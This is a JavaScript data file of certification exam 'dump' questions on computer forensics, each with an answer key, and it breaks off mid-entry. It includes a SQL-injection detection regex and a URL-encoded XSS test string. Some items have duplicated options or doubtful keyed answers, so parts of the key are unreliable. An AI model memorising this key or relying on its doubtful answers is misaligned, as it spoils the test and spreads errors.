export const CHFI_DUMP_QUESTIONS = [
  {
    id: 1,
    question:
      "Which forensic imaging tool is pre-installed on many Linux distributions?",
    options: ["dd", "EnCase", "FTK Imager", "Autopsy"],
    correctAnswer: 0,
  },
  {
    id: 2,
    question:
      "Harry has collected a suspicious executable file from an infected system and seeks to reverse its machine code to instructions written in assembly language. Which tool should he use for this purpose?",
    options: ["HashCalc", "oledump", "BinText", "Ollydbg"],
    correctAnswer: 3,
  },
  {
    id: 3,
    question:
      "Callen, a forensics officer, was tasked with investigating a recent security incident at an organization. To protect the evidence, Callen maintained a logbook of the project to record observations related to the evidence, used tagging to uniquely identify any evidence, and created a chain of custody record.\n\nIdentify the investigation step performed by Callen in the above scenario.",
    options: [
      "Data analysis",
      "Search and seizure",
      "Case analysis",
      "Evidence preservation",
    ],
    correctAnswer: 3,
  },
  {
    id: 4,
    question:
      "Which of the following techniques involves the analysis of logs to detect and study an incident that may have already occurred in a network or device?",
    options: [
      "Cryptanalysis",
      "Social engineering",
      "Postmortem",
      "Steganalysis",
    ],
    correctAnswer: 2,
  },
  {
    id: 5,
    question: 'What does "slack space" refer to in a file system?',
    options: [
      "Space between files on disk",
      "Unused space within a file cluster",
      "Deleted file fragments",
      "Empty clusters within a file",
    ],
    correctAnswer: 1,
  },
  {
    id: 6,
    question: "Which tool can be used to detect rogue devices on a network?",
    options: ["Nmap", "Autopsy", "EnCase", "FTK Imager"],
    correctAnswer: 0,
  },
  {
    id: 7,
    question: "What does the superblock in Linux define?",
    options: [
      "available space",
      "file synonyms",
      "location of the first inode",
      "disk geometry",
    ],
    correctAnswer: 2,
  },
  {
    id: 8,
    question:
      "The following regular expression can be used for detecting a typical SQL injection attack:\n\n/\\w*((\\%27)|(\\'))((\\%6F)|o|(\\%4F))((\\%72)|r|(\\%52))/ix\n\nIdentify the signature in the above expression that searches for the word “or” with various combinations of its hex values (both uppercase and lowercase combinations).",
    options: ["%27)|'", "\\w*", "Union", "((%6F)|o|(%4F))((%72)|r|(%52))"],
    correctAnswer: 3,
  },
  {
    id: 9,
    question:
      "Which of the following cloud computing threats arises from improper resource isolation, data storage in multiple jurisdictions, and lack of knowledge on jurisdictions?",
    options: [
      "Subpoena and e-discovery",
      "Compliance risks",
      "Inadequate infrastructure design and planning",
      "Unknown risk profile",
    ],
    correctAnswer: 1,
  },
  {
    id: 10,
    question:
      "Which type of attack relies on intercepting and altering communications between two parties?",
    options: ["DoS", "Phishing", "Keylogging", "Man-in-the-Middle"],
    correctAnswer: 3,
  },
  {
    id: 11,
    question:
      "Which of the following Azure logs are a type of Azure platform logs that record information on the Azure subscription layer as well as the write operations performed on Azure resources?",
    options: [
      "Azure Resource Logs",
      "Azure Activity Logs",
      "Network Security Group Flow Logs",
      "Azure Active Directory Reports",
    ],
    correctAnswer: 1,
  },
  {
    id: 12,
    question:
      "The file content of evidence files can be viewed using the View Pane. The View pane provides several tabs to view file content. Which of these tabs provides native views of formats supported by Oracle Outside In technology?",
    options: ["Picture tab", "Hex tab", "Text tab", "Doc tab"],
    correctAnswer: 3,
  },
  {
    id: 13,
    question:
      "As a Computer Hacking Forensic Investigator, you are analyzing an intrusion incident involving fileless malware delivered via a malicious Word document through phishing. What is the most effective step to disrupt the infection chain?",
    options: [
      "Implementing a strict policy on macros embedded in Office documents across the organization",
      "Disabling the use of all scripting languages, such as JavaScript, in the corporate environment",
      "Replacing the traditional antivirus solution with the latest signature-based IDS",
      "Patching vulnerabilities in Flash and Java plugins in all browsers within the corporate network",
    ],
    correctAnswer: 0,
  },
  {
    id: 14,
    question:
      "Williams collected evidence, eliminated the root cause, and closed attack vectors. Which phase is this?",
    options: [
      "Eradication",
      "Incident triage",
      "Preparation for incident handling and response",
      "Post-incident activities",
    ],
    correctAnswer: 0,
  },
  {
    id: 15,
    question:
      "Which approach helps identify relay systems and gathers data from forensic events?",
    options: [
      "Fingerprint-based approach",
      "Event aggregation",
      "Vulnerability-based approach",
      "Event de-duplication",
    ],
    correctAnswer: 0,
  },
  {
    id: 16,
    question:
      'Which attack exploits "http" to access unauthorized directories?',
    options: [
      "Unvalidated input",
      "Buffer overflow",
      "Denial of service (DoS)",
      "Path traversal",
    ],
    correctAnswer: 3,
  },
  {
    id: 17,
    question:
      "Which EDRM stage involves policies to handle/safeguard electronic data?",
    options: [
      "Information governance",
      "Identification",
      "Preservation",
      "Collection",
    ],
    correctAnswer: 0,
  },
  {
    id: 18,
    question: "What field is a lay witness considered an expert in?",
    options: [
      "Legal issues",
      "No particular field",
      "Technical forensics",
      "Judging character",
    ],
    correctAnswer: 1,
  },
  {
    id: 19,
    question: "In which RAID level is disk mirroring done?",
    options: ["RAID Level 5", "RAID Level 3", "RAID Level 0", "RAID Level 1"],
    correctAnswer: 3,
  },
  {
    id: 20,
    question: "What does ARP stand for?",
    options: [
      "Application Routing Path",
      "Automated Routing Protocol",
      "Address Resolution Protocol",
      "Address Reallocation Process",
    ],
    correctAnswer: 2,
  },
  {
    id: 21,
    question:
      "Which service helps identify the domain of an IP and its point of contact?",
    options: ["HashMyFiles", "WhatChanged Portable", "ARIN Whois", "Logcat"],
    correctAnswer: 2,
  },
  {
    id: 22,
    question: "What is the main purpose of digital evidence preservation?",
    options: [
      "Maintain integrity for legal proceedings",
      "Speed up analysis",
      "Ensure confidentiality",
      "Encrypt all data",
    ],
    correctAnswer: 0,
  },
  {
    id: 23,
    question: "What is a cold boot attack?",
    options: [
      "Infecting system during boot",
      "BIOS vulnerability exploit",
      "Exploiting data remnants in RAM",
      "Restarting to wipe memory",
    ],
    correctAnswer: 2,
  },
  {
    id: 24,
    question: "Which EFS component uses LPC between LSA and the kernel?",
    options: ["EFS service", "EFS driver", "EFS FSRTL", "CryptoAPI"],
    correctAnswer: 0,
  },
  {
    id: 25,
    question:
      "In an APT cybercrime investigation involving global devices, what is the most effective method to manage complex digital evidence?",
    options: [
      "Traditional investigation of physical devices",
      "Skip legal processes",
      "Invest in powerful automated tools",
      "Collaborate internationally",
    ],
    correctAnswer: 2,
  },
  {
    id: 26,
    question:
      "Which tool extracts LM and NTLM password hashes from the SAM database?",
    options: ["Metashield Analyzer", "EnCase", "BitLocker", "PwDump7"],
    correctAnswer: 3,
  },
  {
    id: 27,
    question:
      "What issue arises from mishandling digital evidence during investigation?",
    options: [
      "Infrastructure issues",
      "Legal issues",
      "Jurisdiction issues",
      "Privacy issues",
    ],
    correctAnswer: 1,
  },
  {
    id: 28,
    question:
      "Which Cisco IOS mnemonic indicates a packet matched a log rule in an access list?",
    options: [
      "%SEC-6-IPACCESSLOGRL",
      "%SEC-4-TOOMANY",
      "%SEC-6-IPACCESSLOGP",
      "%IPV6-6-ACCESSLOGP",
    ],
    correctAnswer: 2,
  },
  {
    id: 29,
    question: "Which is a live forensics method?",
    options: [
      "Analyzing a powered-off system",
      "Collecting RAM data",
      "Cloning a disk",
      "Recovering deleted files",
    ],
    correctAnswer: 1,
  },
  {
    id: 31,
    question: "Which Windows registry datatype stores encoded info?",
    options: [
      "REG_DWORD",
      "REG_NONE",
      "REG_SZ",
      "REG_FULL_RESOURCE_DESCRIPTOR",
    ],
    correctAnswer: 1,
  },
  {
    id: 32,
    question: "What is the function of a MAC address?",
    options: [
      "Encrypt traffic",
      "Provide virtual IP",
      "Identify devices at physical layer",
      "Resolve domain names",
    ],
    correctAnswer: 2,
  },
  {
    id: 33,
    question: "Which ISO standard addresses electronic discovery (eDiscovery)?",
    options: [
      "ISO/IEC 27042",
      "ISO/IEC 27050",
      "ISO/IEC 27043",
      "ISO/IEC 27041",
    ],
    correctAnswer: 1,
  },
  {
    id: 34,
    question:
      "Xavier found the attacker used proxies and a fake identity. What challenge does this represent?",
    options: [
      "Limited legal understanding",
      "Speed",
      "Evidence complexity",
      "Anonymity",
    ],
    correctAnswer: 3,
  },
  {
    id: 35,
    question: "What is the primary function of a honeypot?",
    options: [
      "Block malicious packets",
      "Attract and analyze attackers",
      "Protect the network perimeter",
      "Encrypt traffic",
    ],
    correctAnswer: 1,
  },
  {
    id: 36,
    question: "Which hashing algorithms are used in forensics?",
    options: ["MD5", "SHA-256", "SHA-1", "All of the above"],
    correctAnswer: 3,
  },
  {
    id: 37,
    question:
      "Mike found the crime scene computer was turned off. What should he do?",
    options: [
      "Turn it on and extract data",
      "Turn it on",
      "Turn it on and analyze",
      "Leave it off",
    ],
    correctAnswer: 3,
  },
  {
    id: 38,
    question:
      "Which Apache component handles routines and data exchange with clients?",
    options: ["http_core", "http_protocol", "http_request", "http_main"],
    correctAnswer: 1,
  },
  {
    id: 39,
    question: "Which tool is commonly used for network traffic analysis?",
    options: ["Wireshark", "FTK Imager", "Autopsy", "EnCase"],
    correctAnswer: 0,
  },
  {
    id: 40,
    question: "Which SSD component is volatile and enhances read/write speed?",
    options: ["NAND flash memory", "DRAM", "Controller", "Host interface"],
    correctAnswer: 1,
  },
  {
    id: 41,
    question:
      "Which IoT architecture layer contains hardware components like sensors, RFID tags, and readers?",
    options: [
      "Edge technology layer",
      "Access gateway layer",
      "Middleware layer",
      "Internet layer",
    ],
    correctAnswer: 0,
  },
  {
    id: 42,
    question:
      "Which eDiscovery method involves creating bit-by-bit forensic images of devices?",
    options: [
      "Directed collection",
      "Remote acquisition",
      "Custodian self-collection",
      "Full disk acquisition",
    ],
    correctAnswer: 3,
  },
  {
    id: 43,
    question: "What is the maximum length of an MD5 hash?",
    options: ["32 bits", "128 bits", "64 bits", "256 bits"],
    correctAnswer: 1,
  },
  {
    id: 44,
    question: "Which tool is used to create bit-by-bit disk images?",
    options: ["FTK Imager", "Nmap", "Nessus", "Wireshark"],
    correctAnswer: 0,
  },
  {
    id: 45,
    question:
      "Which tool helps recover deleted emails from Outlook and Thunderbird?",
    options: ["EnCase", "LiME", "Paraben's E3", "THC-Hydra"],
    correctAnswer: 2,
  },
  {
    id: 46,
    question: "Which file type starts with hex: 25 50 44 46?",
    options: ["PDF", "JPEG", "BMP", "GIF"],
    correctAnswer: 0,
  },
  {
    id: 47,
    question: "What is the role of a digital forensic investigator?",
    options: [
      "Manage hardware",
      "Design security systems",
      "Develop software",
      "Collect, preserve, and analyze digital evidence",
    ],
    correctAnswer: 3,
  },
  {
    id: 48,
    question: "Which tool helps intercept and log network traffic?",
    options: ["Honeypot", "Sniffer", "Scanning", "Banner grabbing"],
    correctAnswer: 1,
  },
  {
    id: 49,
    question:
      "Which OWASP risk involves sending untrusted data to an interpreter?",
    options: [
      "Cryptographic failures",
      "Broken access control",
      "Injection",
      "Insecure design",
    ],
    correctAnswer: 2,
  },
  {
    id: 50,
    question:
      "In evidence transfer, do sender and receiver need to record the date and time?",
    options: ["False", "True"],
    correctAnswer: 1,
  },
  {
    id: 51,
    question:
      "Which password-cracking technique tries every possible combination of characters?",
    options: [
      "Pass-the-ticket attack",
      "Dictionary Attack",
      "Wire sniffing",
      "Brute-force attack",
    ],
    correctAnswer: 3,
  },
  {
    id: 52,
    question:
      "Which cloud service does Kellan use for scheduling interviews with automatic notifications?",
    options: ["PaaS", "IaaS", "SaaS", "IDaaS"],
    correctAnswer: 2,
  },
  {
    id: 53,
    question:
      "What is a primary responsibility of a forensic investigator when handling digital evidence?",
    options: [
      "Take permission from all employees",
      "Create an image backup of the original evidence without tampering with it",
      "Harden organization network security",
      "Keep evidence confidential from law enforcement",
    ],
    correctAnswer: 1,
  },
  {
    id: 54,
    question: "What is the difference between hashing and encryption?",
    options: [
      "Hashing is reversible; encryption is not",
      "Encryption requires a key; hashing does not",
      "Hashing uses symmetric keys; encryption does not",
      "Both are used to securely transmit data",
    ],
    correctAnswer: 1,
  },
  {
    id: 55,
    question:
      "Which tool helps in extracting data from a smartwatch for forensic investigation?",
    options: ["Autopsy", "Sysdig", "Pacu", "S3Inspector"],
    correctAnswer: 0,
  },
  {
    id: 56,
    question:
      "Which type of malware replicates itself to spread across systems?",
    options: ["Virus", "Spyware", "Worm", "Adware"],
    correctAnswer: 2,
  },
  {
    id: 57,
    question:
      "Which protocol is used to securely transfer files over the Internet?",
    options: ["SFTP", "HTTP", "FTP", "TFTP"],
    correctAnswer: 0,
  },
  {
    id: 58,
    question:
      "What is the hex equivalent of the character `)` in the URL-encoded string `%3Cscript%3Ealert%28XSS%29%3C%2Fscript%3E`?",
    options: ["<", ">", ")", "("],
    correctAnswer: 2,
  },
  {
    id: 59,
    question:
      "Which Azure CLI command is used to provide time-specific read-only access to a snapshot?",
    options: [
      "az snapshot grant-access",
      "az vm show",
      "az storage blob show",
      "az snapshot delete",
    ],
    correctAnswer: 0,
  },
  {
    id: 60,
    question:
      "Which methodology is best for acquiring volatile data from a live Linux system with limited physical access?",
    options: [
      "Using Belkasoft Live RAM Capturer",
      "Performing remote acquisition using dd and netcat",
      "Performing local acquisition using the LiME tool",
      "Using the fmem module and dd command",
    ],
    correctAnswer: 1,
  },
  {
    id: 61,
    question:
      "Which investigation step has Kannon performed when securing devices affected during an attack for further investigation?",
    options: [
      "Case analysis",
      "Search and seizure",
      "Data acquisition",
      "Data analysis",
    ],
    correctAnswer: 1,
  },
  {
    id: 62,
    question:
      "Which of the following is NOT a common type of digital evidence?",
    options: [
      "Social media posts",
      "Emails",
      "Documents",
      "Hardware components",
    ],
    correctAnswer: 3,
  },
  {
    id: 63,
    question: "What is the main advantage of using cloud-based forensic tools?",
    options: [
      "Scalability and remote accessibility",
      "Always online availability",
      "Cost reduction",
      "Data encryption",
    ],
    correctAnswer: 0,
  },
  {
    id: 64,
    question:
      "Which log file type contains records of all system events on a Windows machine?",
    options: ["Security Log", "Application Log", "System Log", "Audit Log"],
    correctAnswer: 2,
  },
  {
    id: 65,
    question: "What is the primary function of volatile memory?",
    options: [
      "Long-term data storage",
      "Storing backup data",
      "Maintaining log files",
      "Running active processes",
    ],
    correctAnswer: 3,
  },
  {
    id: 66,
    question:
      "Which method do attackers often use to compress, encrypt, or modify a malware executable file to avoid detection?",
    options: [
      "File fingerprinting",
      "Malware disassembly",
      "Performing string search",
      "Obfuscation",
    ],
    correctAnswer: 3,
  },
  {
    id: 67,
    question:
      "What type of external attack is performed when an attacker uses deceptive emails to obtain sensitive information?",
    options: ["Phishing", "Tailgating", "Espionage", "Brute-force"],
    correctAnswer: 0,
  },
  {
    id: 68,
    question:
      "Which approach helps investigators identify if a system serves as a relay to a hacker and helps gather forensic event data?",
    options: [
      "Fingerprint-based approach",
      "Event de-duplication",
      "Vulnerability-based approach",
      "Event aggregation",
    ],
    correctAnswer: 0,
  },
  {
    id: 69,
    question:
      "In the context of malware analysis, what does a sandbox environment provide?",
    options: [
      "Permanent system changes",
      "A controlled space to execute and analyze malware",
      "Direct hardware access",
      "Faster execution of processes",
    ],
    correctAnswer: 1,
  },
  {
    id: 70,
    question:
      "Which file signature verification utility helps check the integrity of critical files on Windows?",
    options: [
      "Netstat",
      "Sigverif",
      "Process monitor",
      "Windows Service Manager",
    ],
    correctAnswer: 1,
  },
  {
    id: 71,
    question: "Which of the following is a common type of cyberattack?",
    options: ["SQL injection", "All of the above", "Phishing", "DDoS"],
    correctAnswer: 1,
  },
  {
    id: 72,
    question: "What type of malware captures keystrokes?",
    options: ["Keylogger", "Worm", "Spyware", "Adware"],
    correctAnswer: 0,
  },
  {
    id: 73,
    question:
      "Identify the correct sequence of steps involved in the forensic acquisition of an Amazon EC2 instance.",
    options: [
      "2 → 1 → 4 → 3 → 6 → 5",
      "1 → 4 → 5 → 6 → 3 → 2",
      "6 → 1 → 5 → 2 → 3 → 4",
      "5 → 3 → 1 → 6 → 4 → 2",
    ],
    correctAnswer: 3,
  },
  {
    id: 74,
    question:
      "Which section of the ACPO Principles of Digital Evidence states that no action should change data that may be relied upon in court?",
    options: ["Principle 3", "Principle 2", "Principle 4", "Principle 1"],
    correctAnswer: 3,
  },
  {
    id: 75,
    question:
      "Identify the malware distribution technique in which attackers use tactics to improve the ranking of malware pages.",
    options: [
      "Blackhat search engine optimization",
      "Social engineered clickjacking",
      "Drive-by downloads",
      "Spear phishing sites",
    ],
    correctAnswer: 0,
  },
  {
    id: 76,
    question: "Which command is used to delete a file in Linux?",
    options: ["mkdir", "rm", "del", "rmdir"],
    correctAnswer: 1,
  },
  {
    id: 77,
    question: "The role of a forensic investigator is to:",
    options: [
      "Create an image backup of the original evidence without tampering with potential evidence",
      "Keep the evidence highly confidential and hide it from law enforcement agencies",
      "Harden organizational network security",
      "Take permission from all employees of the organization for investigation",
    ],
    correctAnswer: 0,
  },
  {
    id: 78,
    question:
      "Which of the following would NOT typically be acquired during the dead acquisition technique?",
    options: [
      "Unallocated drive space",
      "Active network connections",
      "Boot sectors",
      "Web browser cache",
    ],
    correctAnswer: 1,
  },
  {
    id: 79,
    question:
      "Printing under a Windows Computer normally requires which one of the following file types to be created?",
    options: ["EMF", "MEM", "CME", "EME"],
    correctAnswer: 0,
  },
  {
    id: 80,
    question:
      "For the purpose of cracking password-protected files, Bob initiated a technique that attempts every combination of characters. Identify the technique.",
    options: [
      "Brute-force attack",
      "Wire sniffing",
      "Dictionary Attack",
      "Pass-the-ticket attack",
    ],
    correctAnswer: 0,
  },
  {
    id: 81,
    question:
      "Which protocol is used by networked systems to translate domain names into IP addresses?",
    options: ["SMTP", "DHCP", "ARP", "DNS"],
    correctAnswer: 3,
  },
  {
    id: 82,
    question:
      "Which of the following challenges of cybercrime is demonstrated by an attacker using proxies and a fake identity?",
    options: [
      "Evidence size and complexity",
      "Anonymity",
      "Limited legal understanding",
      "Speed",
    ],
    correctAnswer: 1,
  },
  {
    id: 83,
    question:
      "Which of the following commands will help John get the count of all NetBIOS names resolved by broadcast by querying a WINS server?",
    options: ["nbtstat -n", "nbtstat -S", "nbtstat -r", "nbtstat -n"],
    correctAnswer: 2,
  },
  {
    id: 84,
    question:
      "Which component of an SSD is volatile memory and requires power to retain data?",
    options: ["Host interface", "NAND flash memory", "DRAM", "Controller"],
    correctAnswer: 2,
  },
  {
    id: 85,
    question:
      "Kevin used Tor browser for illegal activities. Which type of web was accessed by Kevin?",
    options: ["Indexed web", "Dark web", "Surface web", "Deep web"],
    correctAnswer: 1,
  },
  {
    id: 86,
    question: "Which Windows command can list all active processes?",
    options: ["tracert", "netstat", "tasklist", "ipconfig"],
    correctAnswer: 2,
  },
  {
    id: 87,
    question:
      "Maria wants to see if an executable file adds or modifies any registry values after execution. Which event ID should she look for in Windows Event Viewer?",
    options: [
      "Event ID 4657",
      "Event ID 4688",
      "Event ID 7040",
      "Event ID 4624",
    ],
    correctAnswer: 0,
  },
  {
    id: 88,
    question:
      "Which of the following Azure logs records information on the Azure subscription layer and write operations on Azure resources?",
    options: [
      "Azure Active Directory Reports",
      "Azure Activity Logs",
      "Azure Resource Logs",
      "Network Security Group Flow Logs",
    ],
    correctAnswer: 1,
  },
  {
    id: 89,
    question:
      "Which online service helps forensic investigators determine the domain name of an IP address and obtain the point of contact for the domain?",
    options: ["WhatChanged Portable", "Logcat", "HashMyFiles", "ARIN Whois"],
    correctAnswer: 3,
  },
  {
    id: 90,
    question:
      "Which U.S. law requires financial institutions to protect customer information against security threats?",
    options: ["FISMA", "SOX", "HIPAA", "GLBA"],
    correctAnswer: 3,
  },
  {
    id: 91,
    question:
      "Which Tor relay is used for transmitting data in an encrypted format and passing it from the entry relay to the exit relay?",
    options: ["Middle relay", "Guard relay", "Exit relay", "Entry relay"],
    correctAnswer: 0,
  },
  {
    id: 92,
    question:
      "Which investigation step did Callen perform by maintaining a logbook, tagging evidence, and creating a chain of custody record?",
    options: [
      "Search and seizure",
      "Evidence preservation",
      "Data analysis",
      "Case analysis",
    ],
    correctAnswer: 1,
  },
  {
    id: 93,
    question:
      "What activity did James perform by obtaining documented permission from the device owner to conduct the investigation?",
    options: [
      "Seeking consent",
      "Searches without a warrant",
      "Obtaining a warrant for search and seizure",
      "Obtaining witness signatures",
    ],
    correctAnswer: 0,
  },
  {
    id: 94,
    question:
      "Which command allows investigators to mount an APFS image and view its contents on a Linux system?",
    options: ["fsutil", "strings", "losetup", "wevtutil"],
    correctAnswer: 2,
  },
  {
    id: 95,
    question:
      "What methodology is most suitable for acquiring volatile data from a live Linux system with limited physical access?",
    options: [
      "Using the fmem module and dd command locally to access RAM",
      "Performing remote acquisition of volatile data using dd and netcat",
      "Performing local acquisition using the LiME tool",
      "Using Belkasoft Live RAM Capturer",
    ],
    correctAnswer: 1,
  },
  {
    id: 96,
    question:
      "What obfuscation method did the attacker use by utilizing “%0b” characters to bypass firewall protection?",
    options: [
      "White space manipulation",
      "Replaced keywords",
      "In-line comment",
      "Double encoding",
    ],
    correctAnswer: 0,
  },
  {
    id: 97,
    question:
      "Which artifact helps an investigator explore the Tor browser when it is uninstalled or installed in a location other than the Windows desktop?",
    options: ["Rp.log Files", "PDF Files", "Prefetch Files", "Image Files"],
    correctAnswer: 2,
  },
  {
    id: 98,
    question:
      "Which is the correct sequence of stages involved in the first response by laboratory forensic staff?",
    options: [
      "5 -> 4 -> 2 -> 1 -> 6 -> 5",
      "3 -> 2 -> 1 -> 4 -> 5 -> 6",
      "1 -> 5 -> 6 -> 3 -> 2 -> 4",
      "3 -> 5 -> 4 -> 1 -> 6 -> 2",
    ],
    correctAnswer: 3,
  },
  {
    id: 99,
    question:
      "Which dcfldd command is used by investigators to compare an image file to the original medium (like a drive or partition)?",
    options: [
      "dd if=/dev/sdb | split –b 650m - image_sdb",
      "dcfldd if=/dev/sda split=2M of=usbimg hash=md5 hashlog=usbhash.log",
      "dcfldd if=/dev/sda vf=image.dd",
      "dcfldd if=/dev/sda of=usbimg.dat",
    ],
    correctAnswer: 2,
  },
  {
    id: 100,
    question:
      "Which technique is used by attackers to confuse and mislead the forensic investigation process, including log tampering, false email headers, timestamp modification, and file header modifications?",
    options: [
      "Trial obfuscation",
      "HTML injection",
      "File fingerprinting",
      "Rule-based attack",
    ],
    correctAnswer: 0,
  },
  {
    id: 101,
    question:
      "In Java, which process enables low memory consumption and quick start-up times by using a single instance of the Dalvik Virtual Machine?",
    options: ["init", "Zygote", "Daemon", "Media server"],
    correctAnswer: 1,
  },
  {
    id: 102,
    question:
      "Which registry datatype in a Windows system is used for storing encoded information?",
    options: [
      "REG_DWORD",
      "REG_FULL_RESOURCE_DESCRIPTOR",
      "REG_SZ",
      "REG_NONE",
    ],
    correctAnswer: 3,
  },
  {
    id: 103,
    question: "Which of the following is NOT a valid hashing algorithm?",
    options: ["AES", "MD5", "SHA-256", "SHA-1"],
    correctAnswer: 0,
  },
  {
    id: 104,
    question:
      "Which technique involves analyzing logs to detect and study an incident that has already occurred in a network or device?",
    options: [
      "Postmortem",
      "Social engineering",
      "Steganalysis",
      "Cryptanalysis",
    ],
    correctAnswer: 0,
  },
  {
    id: 105,
    question:
      "Which aspect of the Tor network should an investigator focus on primarily to trace the origin of a data transmission?",
    options: [
      "The Entry/Guard Relay, as it provides an entry point to the Tor network",
      "The Middle Relay, as it transmits the data in an encrypted format",
      "The Exit Relay, as it sends the data to the destination server",
      "The Tor Bridge Node, as it helps to circumvent restrictions on the Tor network",
    ],
    correctAnswer: 2,
  },
  {
    id: 106,
    question:
      "Which registry location stores Tor browser artifacts and can provide information on user activities on the dark web?",
    options: [
      "HKEY_USERS<SID>\\SOFTWARE\\Mozilla\\Firefox\\Launcher",
      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\exefile\\shell\\open\\command",
      "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles{GUID}",
      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\BagMRU",
    ],
    correctAnswer: 0,
  },
  {
    id: 107,
    question:
      "In which forensic data acquisition step do investigators overwrite data with sequential zeros or ones to protect it from recovery?",
    options: [
      "Sanitize the target media",
      "Acquiring volatile data",
      "Validating data acquisition",
      "Planning for contingency",
    ],
    correctAnswer: 0,
  },
  {
    id: 108,
    question:
      "Which of the following refers to the data that might still exist in a cluster even though the original file has been overwritten by another file?",
    options: ["MFT", "Sector", "Metadata", "Slack Space"],
    correctAnswer: 3,
  },
  {
    id: 109,
    question:
      "What is the primary role of a write blocker in digital forensics?",
    options: [
      "Allow modifications to the original drive",
      "Prevent writing to a target drive",
      "Encrypt forensic images",
      "Ensure faster data transfer",
    ],
    correctAnswer: 1,
  },
  {
    id: 110,
    question:
      "Joey, a forensics analyst, found a security event with Event ID 4758 while analyzing logs. What event did Joey identify?",
    options: [
      "A security-enabled universal group was deleted.",
      "A member was added to a security-enabled universal group.",
      "A security-enabled universal group was changed.",
      "A security-enabled universal group was deleted.",
    ],
    correctAnswer: 0,
  },
  {
    id: 111,
    question: "What is the default port for SSH?",
    options: ["21", "23", "443", "22"],
    correctAnswer: 3,
  },
  {
    id: 112,
    question:
      "In which step of forensic readiness planning do investigators determine what happens to potential evidence data and its impact on the business?",
    options: [
      "Keep an incident response team ready to review the incident and preserve the evidence.",
      "Establish a policy for securely handling and storing the collected evidence.",
      "Identify the potential evidence required for an incident.",
      "Determine the sources of evidence.",
    ],
    correctAnswer: 3,
  },
  {
    id: 113,
    question:
      "Which practice is associated with scene assessment in ENFSI best practices for forensic examination?",
    options: [
      "Conduct a preliminary risk assessment of the seized exhibits and record any issues",
      "Conduct an initial evaluation of the case before the formal assessment to check and discuss organizational requirements and potential risks",
      "Proactively develop and arrange pre-scene preparations so that forensic laboratory staff can perform their responsibilities in a timely manner",
      "Process the seized exhibits based on the laboratory policy",
    ],
    correctAnswer: 3,
  },
  {
    id: 114,
    question:
      "Which of the following AWS services helps forensic investigators to monitor and analyze various log sources, such as Amazon S3 logs, CloudTrail management event logs, DNS logs, etc., to identify security threats?",
    options: ["XRY LOGICAL", "Autopsy", "ModSecurity", "GuardDuty"],
    correctAnswer: 3,
  },
  {
    id: 115,
    question:
      "Which of the following types of jailbreaks allows users to reboot the iOS device any number of times because after every reboot, the device gets jailbroken automatically?",
    options: [
      "Semi-untethered jailbreak",
      "Semi-tethered jailbreak",
      "Tethered jailbreak",
      "Untethered jailbreak",
    ],
    correctAnswer: 3,
  },
  {
    id: 116,
    question: "What is the primary purpose of timestamps in digital forensics?",
    options: [
      "Encrypt sensitive data",
      "Prevent unauthorized access to data",
      "Verify the time of file creation, modification, and access",
      "Compress evidence data",
    ],
    correctAnswer: 2,
  },
  {
    id: 117,
    question:
      "Identify the `dcfldd` command that investigators use to compare an image file to the original medium, such as a drive or partition.",
    options: [
      "dd if=/dev/sdb | split –b 650m - image_sdb",
      "dcfldd if=/dev/sda vf=image.dd",
      "dcfldd if=/dev/sda split=2M of=usbimg hash=md5 hashlog=usbhash.log",
      "dcfldd if=/dev/sda of=usbimg.dat",
    ],
    correctAnswer: 1,
  },
  {
    id: 118,
    question:
      "What is the primary purpose of the tool Cain & Abel in forensic investigations?",
    options: [
      "File recovery",
      "Password recovery",
      "Network scanning",
      "Disk imaging",
    ],
    correctAnswer: 1,
  },
  {
    id: 119,
    question:
      "Which of the following eDiscovery team members performs the deployment of tools on a suspected computer machine and configures, implements, and maintains the deployed tools?",
    options: [
      "IT Support Personnel",
      "eDiscovery Attorney",
      "eDiscovery Software Expert",
      "Processing/Review Personnel",
    ],
    correctAnswer: 2,
  },
  {
    id: 120,
    question:
      "Identify the correct sequence of steps involved in the forensic acquisition of persistent disk volumes (GCP):",
    options: [
      "3 → 2 → 4 → 1",
      "4 → 3 → 2 → 1",
      "1 → 2 → 3 → 4",
      "2 → 3 → 1 → 4",
    ],
    correctAnswer: 0,
  },
  {
    id: 121,
    question:
      "In the `netstat` command, which parameter is used to display active TCP connections and includes the Process ID (PID) for each connection?",
    options: ["-r", "-o", "-n", "-p"],
    correctAnswer: 1,
  },
  {
    id: 122,
    question:
      "Files stored in the Recycle Bin in its physical location are renamed as Dxy.ext, where 'x' represents the ________.",
    options: [
      "Original file name's extension",
      "Drive name",
      "Original file name",
      "Sequential number",
    ],
    correctAnswer: 1,
  },
  {
    id: 123,
    question:
      "Which forensic technique is used to reconstruct a file system from damaged storage media?",
    options: [
      "Keyword search",
      "File carving",
      "Steganalysis",
      "Timeline analysis",
    ],
    correctAnswer: 1,
  },
  {
    id: 124,
    question: "What does the 'traceroute' command do?",
    options: [
      "Detects open ports on a target system",
      "Sniffs packets in real time",
      "Measures network bandwidth",
      "Identifies the path packets take to reach a destination",
    ],
    correctAnswer: 3,
  },
  {
    id: 125,
    question:
      "Which Linux command can be used to view all active network connections?",
    options: ["iptables", "df", "netstat", "top"],
    correctAnswer: 2,
  },
  {
    id: 126,
    question:
      "Which of the following PowerPoint streams contains information about the presentation layout and its contents?",
    options: [
      "Current user stream",
      "Summary information streams",
      "PowerPoint document stream",
      "Pictures stream",
    ],
    correctAnswer: 2,
  },
  {
    id: 127,
    question:
      "Which of the following fields of an IIS log entry can be reviewed to determine whether a request made by a client is fulfilled without an error?",
    options: ["cs-method", "cs(User-Agent)", "sc-status", "cs-username"],
    correctAnswer: 2,
  },
  {
    id: 128,
    question:
      "Which Windows command is used to check the IP configuration of a system?",
    options: ["ipconfig", "traceroute", "netstat", "ping"],
    correctAnswer: 0,
  },
  {
    id: 129,
    question: "What is the role of the forensic investigator?",
    options: [
      "Keep the evidence confidential and hide it from law enforcement",
      "Take permission from all employees",
      "Harden network security",
      "Create an image backup of the original evidence without tampering",
    ],
    correctAnswer: 3,
  },
  {
    id: 130,
    question:
      "What type of analysis is performed when reviewing DNS cache to check domain contact attempts?",
    options: [
      "Power analysis",
      "Cryptanalysis",
      "System behavior analysis",
      "Network behavior analysis",
    ],
    correctAnswer: 3,
  },
  {
    id: 131,
    question:
      "Which tool assists investigators in retrieving deleted emails from Outlook and Thunderbird?",
    options: ["THC-Hydra", "Encase", "LiME", "Paraben's E3"],
    correctAnswer: 3,
  },
  {
    id: 132,
    question:
